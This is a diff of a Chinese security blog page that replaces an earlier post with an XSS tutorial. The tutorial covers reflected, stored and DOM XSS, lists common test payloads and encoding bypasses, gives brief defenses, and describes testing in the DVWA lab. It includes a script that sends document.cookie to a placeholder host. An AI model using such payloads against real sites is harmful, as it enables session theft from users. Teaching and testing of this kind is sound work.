@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="安全,">
+  <meta name="keywords" content="XSS,">
 
 
 
@@ -86,18 +86,17 @@
 
 
 
-<meta name="description" content="八佰伴">
-<meta name="keywords" content="安全">
+<meta name="keywords" content="XSS">
 <meta property="og:type" content="article">
-<meta property="og:title" content="极限加固">
-<meta property="og:url" content="http://yoursite.com/2019/10/14/极限加固/index.html">
+<meta property="og:title" content="XSS（跨站脚本攻击）">
+<meta property="og:url" content="http://yoursite.com/2019/10/15/XSS（跨站脚本攻击）/index.html">
 <meta property="og:site_name" content="信息安全">
-<meta property="og:description" content="八佰伴">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-14T12:48:09.698Z">
+<meta property="og:image" content="http://yoursite.com/2019/10/15/XSS（跨站脚本攻击）/index.html##">
+<meta property="og:updated_time" content="2019-10-19T05:20:47.411Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="极限加固">
-<meta name="twitter:description" content="八佰伴">
+<meta name="twitter:title" content="XSS（跨站脚本攻击）">
+<meta name="twitter:image" content="http://yoursite.com/2019/10/15/XSS（跨站脚本攻击）/index.html##">
 
 
 
@@ -127,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/10/14/极限加固/">
+  <link rel="canonical" href="http://yoursite.com/2019/10/15/XSS（跨站脚本攻击）/">
 
 
 
 
 
-  <title>极限加固 | 信息安全</title>
+  <title>XSS（跨站脚本攻击） | 信息安全</title>
   
 
 
@@ -302,7 +301,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/14/极限加固/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/15/XSS（跨站脚本攻击）/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Rardar">
@@ -319,7 +318,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">极限加固</h1>
+          <h1 class="post-title" itemprop="name headline">XSS（跨站脚本攻击）</h1>
         
 
         <div class="post-meta">
@@ -331,8 +330,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-14T18:41:37+08:00">
-                2019-10-14
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-15T11:24:57+08:00">
+                2019-10-15
               </time>
             
 
@@ -341,6 +340,28 @@
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -363,7 +384,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  0
+                  962
                 </span>
               
 
@@ -379,7 +400,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  1
+                  3
                 </span>
               
             </div>
@@ -400,7 +421,28 @@
       
 
       
-        
+        <hr>
+<a id="more"></a>
+
+<h1 id="1-XSS漏洞概述"><a href="#1-XSS漏洞概述" class="headerlink" title="1.XSS漏洞概述"></a>1.XSS漏洞概述</h1><h2 id="1-1-漏洞简介"><a href="#1-1-漏洞简介" class="headerlink" title="1.1 漏洞简介"></a>1.1 漏洞简介</h2><p>跨站脚本攻击—XSS（Cross Site Script），是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，控制用户浏览器进行操作的攻击方式。假设，在一个服务端上，有一处功能使用了这段代码，他的功能是将用户输入的内容输出到页面上，很常见的一个功能。但是假如，这里输入的内容是一段经过构造的js。那么在用户再次访问这个页面时，就会获取使用js在用户的浏览器端执行一个弹窗操作。通过构造其他相应的代码，攻击者可以执行更具危害的操作。</p>
+<h2 id="1-2-XSS漏洞原理"><a href="#1-2-XSS漏洞原理" class="headerlink" title="1.2 XSS漏洞原理"></a>1.2 XSS漏洞原理</h2><h3 id="1-2-1-反射型"><a href="#1-2-1-反射型" class="headerlink" title="1.2.1 反射型"></a>1.2.1 反射型</h3><p>非持久型，常见的就是在URL中构造，将恶意链接发送给目标用户。当用户访问该链接时候，会向服务器发起一个GET请求来提交带有恶意代码的链接。造成反弹型XSS 主要是GET类型</p>
+<h3 id="1-2-2-存储型"><a href="#1-2-2-存储型" class="headerlink" title="1.2.2 存储型"></a>1.2.2 存储型</h3><p>持久型，常见的就是在博客留言板、反馈投诉、论坛评论、将恶意代码和正文都存入服务器的数据库。每次访问都会触发恶意代码。 例如：<code>alert(/xss/)</code></p>
+<h3 id="1-2-3-DOM型"><a href="#1-2-3-DOM型" class="headerlink" title="1.2.3 DOM型"></a>1.2.3 DOM型</h3><p>DOM型是特殊的反射型XSS 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://xxxx/a?&quot;+escape(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-3-XSS危害"><a href="#1-3-XSS危害" class="headerlink" title="1.3 XSS危害"></a>1.3 XSS危害</h2><h3 id="1-3-1-盗取管理员cookie"><a href="#1-3-1-盗取管理员cookie" class="headerlink" title="1.3.1 盗取管理员cookie"></a>1.3.1 盗取管理员cookie</h3><p>盗取管理员的cookie然后登陆后台，获取到后台权限。</p>
+<h3 id="1-3-2-XSS蠕虫攻击"><a href="#1-3-2-XSS蠕虫攻击" class="headerlink" title="1.3.2 XSS蠕虫攻击"></a>1.3.2 XSS蠕虫攻击</h3><p>可以构成几何的速度进行传播xss代码，获取大部分人的权限。一般配合csrf使用</p>
+<h2 id="1-4-常用XSS语句"><a href="#1-4-常用XSS语句" class="headerlink" title="1.4 常用XSS语句"></a>1.4 常用XSS语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/);&lt;/script&gt; //经典语句</span><br><span class="line"></span><br><span class="line">&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;a href = javasript:alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-5-XSS漏洞绕过"><a href="#1-5-XSS漏洞绕过" class="headerlink" title="1.5 XSS漏洞绕过"></a>1.5 XSS漏洞绕过</h2><h3 id="1-5-1-JS编码"><a href="#1-5-1-JS编码" class="headerlink" title="1.5.1 JS编码"></a>1.5.1 JS编码</h3><p>三个八进制数；如果不够前面补0 两个十六进制数字；如果不够前面补0 四个十六进制数字；如果不够前面补0 控制字符</p>
+<h3 id="1-5-2-HTML实体编码"><a href="#1-5-2-HTML实体编码" class="headerlink" title="1.5.2 HTML实体编码"></a>1.5.2 HTML实体编码</h3><p>以<code>&amp;</code>开始<code>;</code>结束</p>
+<h3 id="1-5-3-URL编码"><a href="#1-5-3-URL编码" class="headerlink" title="1.5.3 URL编码"></a>1.5.3 URL编码</h3><p>%27 考虑HTML的渲染方式选择合适的编码方式进行测试</p>
+<h2 id="1-6-XSS漏洞浏览器问题"><a href="#1-6-XSS漏洞浏览器问题" class="headerlink" title="1.6 XSS漏洞浏览器问题"></a>1.6 XSS漏洞浏览器问题</h2><p>有些浏览器会过滤掉一些js脚本，在测试的时候需要关闭对JavaScript的检测。</p>
+<h2 id="0×06-XSS漏洞防御"><a href="#0×06-XSS漏洞防御" class="headerlink" title="0×06 XSS漏洞防御"></a>0×06 XSS漏洞防御</h2><p>过滤输入的数据，和非法字符<code>‘ “ &lt; &gt; on* 等”’</code> 输出到页面的数据进行相应的编码转换包括HTML实体编码、JavaScript编码等</p>
+<h1 id="2-测试方法"><a href="#2-测试方法" class="headerlink" title="2. 测试方法"></a>2. 测试方法</h1><h2 id="2-1-手工测试"><a href="#2-1-手工测试" class="headerlink" title="2.1 手工测试"></a>2.1 手工测试</h2><p>这里我们选取DVWA靶场进行手工测试。</p>
+<h3 id="2-1-1"><a href="#2-1-1" class="headerlink" title="2.1.1"></a>2.1.1</h3><h3 id="2-1-1-1-DVWA-简介"><a href="#2-1-1-1-DVWA-简介" class="headerlink" title="2.1.1.1 DVWA 简介"></a>2.1.1.1 DVWA 简介</h3><p>DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。</p>
+<h4 id="2-1-1-3-测试过程"><a href="#2-1-1-3-测试过程" class="headerlink" title="2.1.1.3 测试过程"></a>2.1.1.3 测试过程</h4><p> ** Low ** ** Low_DOM XSS ** 用 <img src="##" onerror="alert(document.cookie)"> 即可触发XSS  </p>
+
       
     </div>
     
@@ -451,7 +493,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/安全/" rel="tag"><i class="fa fa-tag"></i> 安全</a>
+            <a href="/tags/XSS/" rel="tag"><i class="fa fa-tag"></i> XSS</a>
           
         </div>
       
@@ -464,8 +506,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/14/my-first-blog(2)/" rel="next" title="my-first-blog">
-                <i class="fa fa-chevron-left"></i> my-first-blog
+              <a href="/2019/10/15/流量分析/" rel="next" title="流量分析">
+                <i class="fa fa-chevron-left"></i> 流量分析
               </a>
             
           </div>
@@ -474,8 +516,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/10/14/应急响应/" rel="prev" title="应急响应">
-                应急响应 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/10/15/SQLMAP/" rel="prev" title="SQLMAP">
+                SQLMAP <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -537,8 +579,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -553,7 +604,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -639,6 +690,22 @@
       </section>
 
       
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-XSS漏洞概述"><span class="nav-number">1.</span> <span class="nav-text">1.XSS漏洞概述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-漏洞简介"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-XSS漏洞原理"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 XSS漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-1-反射型"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.2.1 反射型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-2-存储型"><span class="nav-number">1.2.2.</span> <span class="nav-text">1.2.2 存储型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-3-DOM型"><span class="nav-number">1.2.3.</span> <span class="nav-text">1.2.3 DOM型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-XSS危害"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 XSS危害</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-1-盗取管理员cookie"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.3.1 盗取管理员cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-2-XSS蠕虫攻击"><span class="nav-number">1.3.2.</span> <span class="nav-text">1.3.2 XSS蠕虫攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-常用XSS语句"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 常用XSS语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-5-XSS漏洞绕过"><span class="nav-number">1.5.</span> <span class="nav-text">1.5 XSS漏洞绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-1-JS编码"><span class="nav-number">1.5.1.</span> <span class="nav-text">1.5.1 JS编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-2-HTML实体编码"><span class="nav-number">1.5.2.</span> <span class="nav-text">1.5.2 HTML实体编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-3-URL编码"><span class="nav-number">1.5.3.</span> <span class="nav-text">1.5.3 URL编码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-6-XSS漏洞浏览器问题"><span class="nav-number">1.6.</span> <span class="nav-text">1.6 XSS漏洞浏览器问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0×06-XSS漏洞防御"><span class="nav-number">1.7.</span> <span class="nav-text">0×06 XSS漏洞防御</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-测试方法"><span class="nav-number">2.</span> <span class="nav-text">2. 测试方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-手工测试"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 手工测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-1"><span class="nav-number">2.1.1.</span> <span class="nav-text">2.1.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-1-1-DVWA-简介"><span class="nav-number">2.1.2.</span> <span class="nav-text">2.1.1.1 DVWA 简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-1-3-测试过程"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">2.1.1.3 测试过程</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
 
       
 
@@ -684,7 +751,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共1.4k字</span>
+  <span class="post-count">博客全站共8.2k字</span>
 </div>
         
 
